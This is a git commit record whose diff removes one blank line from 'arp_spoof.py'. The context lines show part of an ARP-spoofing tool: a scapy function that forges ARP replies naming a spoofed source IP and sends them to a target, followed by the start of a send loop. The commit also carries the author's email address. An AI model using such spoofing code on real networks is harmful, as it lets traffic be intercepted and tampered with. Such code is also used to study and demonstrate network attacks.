8819e029b91280c15f45a55007f7a003527ca1c6
ap7kj <spearekurwa@yandex.com>
2022-12-06 14:46:25 +0300

    Add Except, Dynamic TEXT

--- arp_spoof/src/arp_spoof.py
+++ arp_spoof/src/arp_spoof.py
@@ -19,7 +19,6 @@ def spoof(target_ip, spoof_ip):
     packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
     scapy.send(packet, verbose=False)
 
-
 try :
     COUNTER = 0
     while True:
